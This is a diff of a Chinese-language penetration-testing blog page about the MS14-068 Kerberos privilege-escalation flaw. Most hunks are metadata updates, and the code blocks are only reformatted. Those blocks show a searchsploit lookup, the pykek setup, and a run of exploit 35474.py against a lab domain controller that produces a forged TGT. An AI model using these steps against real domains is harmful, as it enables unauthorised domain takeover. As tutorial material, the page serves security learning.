@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-02-23T09:49:00.000Z">
-<meta property="article:modified_time" content="2023-12-12T03:19:25.638Z">
+<meta property="article:modified_time" content="2023-12-17T08:26:43.546Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
@@ -243,7 +243,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-12 11:19:25" itemprop="dateModified" datetime="2023-12-12T11:19:25+08:00">2023-12-12</time>
+      <time title="修改时间：2023-12-17 16:26:43" itemprop="dateModified" datetime="2023-12-17T16:26:43+08:00">2023-12-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -270,7 +270,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>468</span>
+      <span>470</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -309,13 +309,7 @@ id="查看目标是否存在ms14-068漏洞">4、查看目标是否存在MS14-068
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220223175612265-1136463140.png" /></p>
 <h2 id="漏洞利用">2. 漏洞利用</h2>
 <h3 id="渗透代码">1、渗透代码：</h3>
-<pre><code>root@kali:~/Desktop/test# searchsploit ms14-068
----------------------------------------- ----------------------------------------
- Exploit Title                          |  Path
-                                        | (/usr/share/exploitdb/)
----------------------------------------- ----------------------------------------
-Microsoft Windows Kerberos - Privilege  | exploits/windows/remote/35474.py
----------------------------------------- ----------------------------------------</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/test<span class="comment"># searchsploit ms14-068</span></span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                          |  Path</span><br><span class="line">                                        | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line">Microsoft Windows Kerberos - Privilege  | exploits/windows/remote/35474.py</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure>
 <p><strong>或：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/35474"
 class="uri">https://www.exploit-db.com/exploits/35474</a></strong></p>
 <h3 id="现成工具">2、现成工具</h3>
@@ -329,20 +323,7 @@ Wiki/blob/master/windowsTools/PsExec64.exe&gt;</p>
 <p><strong>（1）渗透代码生成</strong></p>
 <p><strong>需安装的库：<a target="_blank" rel="noopener" href="https://github.com/mubix/pykek"
 class="uri">https://github.com/mubix/pykek</a></strong></p>
-<pre><code>root@kali:/usr/lib/python2.7# mv /pykek/* /usr/local/lib/python2.7/dist-packages/
-root@kali:/usr/lib/python2.7# ls /usr/local/lib/python2.7/dist-packages/
-kek  ms14-068.py  pyasn1  pykek
-root@kali:~/Desktop/test# python /root/Desktop/test/35474.py  -u win7@lab.com -s S-1-5-21-2143070836-2917229441-1237987123-1115 -d 10.10.10.130 
-Password: 
-  [+] Building AS-REQ for 10.10.10.130... Done!
-  [+] Sending AS-REQ to 10.10.10.130... Done!
-  [+] Receiving AS-REP from 10.10.10.130... Done!
-  [+] Parsing AS-REP from 10.10.10.130... Done!
-  [+] Building TGS-REQ for 10.10.10.130... Done!
-  [+] Sending TGS-REQ to 10.10.10.130... Done!
-  [+] Receiving TGS-REP from 10.10.10.130... Done!
-  [+] Parsing TGS-REP from 10.10.10.130... Done!
-  [+] Creating ccache file &#39;TGT_win7@lab.com.ccache&#39;... Done!</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/lib/python2.7<span class="comment"># mv /pykek/* /usr/local/lib/python2.7/dist-packages/</span></span><br><span class="line">root@kali:/usr/lib/python2.7<span class="comment"># ls /usr/local/lib/python2.7/dist-packages/</span></span><br><span class="line">kek  ms14-068.py  pyasn1  pykek</span><br><span class="line">root@kali:~/Desktop/test<span class="comment"># python /root/Desktop/test/35474.py  -u win7@lab.com -s S-1-5-21-2143070836-2917229441-1237987123-1115 -d 10.10.10.130 </span></span><br><span class="line">Password: </span><br><span class="line">  [+] Building AS-REQ <span class="keyword">for</span> 10.10.10.130... Done!</span><br><span class="line">  [+] Sending AS-REQ to 10.10.10.130... Done!</span><br><span class="line">  [+] Receiving AS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Parsing AS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Building TGS-REQ <span class="keyword">for</span> 10.10.10.130... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 10.10.10.130... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 10.10.10.130... Done!</span><br><span class="line">  [+] Creating ccache file <span class="string">&#x27;TGT_win7@lab.com.ccache&#x27;</span>... Done!</span><br></pre></td></tr></table></figure>
 <p><strong>注意：-d
 指定域控制器名称/IP【除非kali也指定同一个DNS（域控），否则需要写入IP地址】</strong></p>
 <p><strong>（2）Ms14-068.exe生成</strong></p>
@@ -438,7 +419,7 @@ Password:
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:14</span>
+    <span title="站点阅读时长">10:15</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
